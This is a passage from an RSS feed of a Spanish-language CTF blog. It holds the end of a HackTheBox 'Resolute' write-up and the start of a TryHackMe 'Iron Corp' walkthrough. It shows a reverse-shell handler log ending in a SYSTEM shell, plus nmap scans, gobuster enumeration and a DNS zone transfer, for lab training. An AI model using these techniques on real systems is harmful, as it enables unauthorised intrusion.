&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started reverse TCP handler on 10.10.15.105:1339 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Command shell session &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; opened &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.15.105:1339 -&amp;gt; 10.10.10.169:52284&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-01-07 19:05:30 -0600



C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem

C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Cambiamos a una shell de windows y leemos nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/resolute/Screenshot_2020-01-07_19-04-19.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/resolute/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/resolute/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Iron Corp</title>
        <link>https://sckull.github.io/posts/ironcorp/</link>
        <pubDate>Tue, 12 May 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 12 May 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/ironcorp/</guid>
        <description>Iron Corp es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Iron Corp es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Iron Corp&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Can you get access to Iron Corp&amp;rsquo;s system?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;160&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Dificil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MrSeth6797&#34;&gt;MrSeth6797&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (8080), rdp (3889) y el puerto dns (53) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat May  9 00:53:02 2020 as: nmap -Pn -T5 -p1-65535 -o scan_allports ironcorp.me&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; ironcorp.me &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.84.168&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.33s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65528&lt;/span&gt; filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
3389/tcp  open  ms-wbt-server
8080/tcp  open  http-proxy
11025/tcp open  unknown
49667/tcp open  unknown
49670/tcp open  unknown

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat May  9 01:00:44 2020 -- 1 IP address (1 host up) scanned in 462.74 seconds&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Sat May  9 01:12:08 2020 as: nmap -Pn -sV -sC -p53,135,3389,8080,11025,49667,49670 -o scan_allports_big ironcorp.me&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; ironcorp.me &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.84.168&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNSVersionBindReqTCP: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     version
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    &lt;span class=&#34;nb&#34;&gt;bind&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; rdp-ntlm-info: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Target_Name: WIN-8VMBKF3G815
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS_Domain_Name: WIN-8VMBKF3G815
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS_Computer_Name: WIN-8VMBKF3G815
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNS_Domain_Name: WIN-8VMBKF3G815
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNS_Computer_Name: WIN-8VMBKF3G815
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Product_Version: 10.0.14393
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System_Time: 2020-05-09T06:14:42+00:00
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;WIN-8VMBKF3G815
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2020-04-12T18:27:11
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2020-10-12T18:27:11
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2020-05-09T06:14:55+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 0s from scanner time.
8080/tcp  open  http          Microsoft IIS httpd 10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Dashtreme Admin - Free Dashboard &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; Bootstrap &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; by Codervent
11025/tcp open  http          Apache httpd 2.4.41 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Win64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.1.1c PHP/7.4.4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.41 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Win64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.1.1c PHP/7.4.4
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Coming Soon - Start Bootstrap Theme
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.80%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5/9%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5EB649C4%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DNSVe
SF:rsionBindReqTCP,20,&lt;span class=&#34;s2&#34;&gt;&amp;#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:04bind\0\0\x10\0\x03&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat May  9 01:14:55 2020 -- 1 IP address (1 host up) scanned in 167.13 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http-8080&#34;&gt;HTTP 8080&lt;/h2&gt;
&lt;p&gt;En el puerto 8080 encontramos una pagina en la que vemos un dashboard.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200508_011218.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/ironcorp# gobuster dir -u http://ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/assets &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/calendar.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/forms.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/icons.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Login.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/profile.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/register.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@upset:~/thm/ironcorp#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;dig---dns-enumeration&#34;&gt;DIG - DNS Enumeration&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;DIG&lt;/code&gt; para obtener informacion de los DNS.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200508_010758.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hacemos una transferencia de zona y encontramos dos nuevos subdominios.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200508_010950.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuevamente ejecutamos Gobuster en los nuevos dos subdominios y encontramos las mismas direcciones que en el dominio principal.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/ironcorp# gobuster dir -u http://internal.ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/assets &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/calendar.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/forms.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/icons.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Login.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/profile.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/register.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@upset:~/thm/ironcorp# gobuster dir -u http://admin.ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt
/assets &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/calendar.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/forms.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/icons.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/login.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Login.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/profile.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/register.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@upset:~/thm/ironcorp#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En los tres subdominios encontramos la misma pagina estatica.&lt;/p&gt;
&lt;h2 id=&#34;http-11025&#34;&gt;HTTP 11025&lt;/h2&gt;
&lt;p&gt;En el puerto 11025 encontramos una pagina en la que vemos un formulario de email.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200508_235925.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el subdominio &lt;code&gt;internal.ironcorp.me&lt;/code&gt; al parecer no tiene nada&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_002413.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el subdominio &lt;code&gt;admin.ironcorp.me&lt;/code&gt; una autenticacion basica&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/ironcorp/Screenshot_20200509_002530.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuevamente ejecutamos Gobuster en el dominio principal pero no encontramos nada interesante.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/ironcorp# gobuster dir -u http://ironcorp.me:11025/ -w /usr/share/wordlists/dirb/common.txt -q -t &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt; -x php,html,txt,aspx,asp -s 200,301
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/img &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/Index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/license &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/LICENSE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
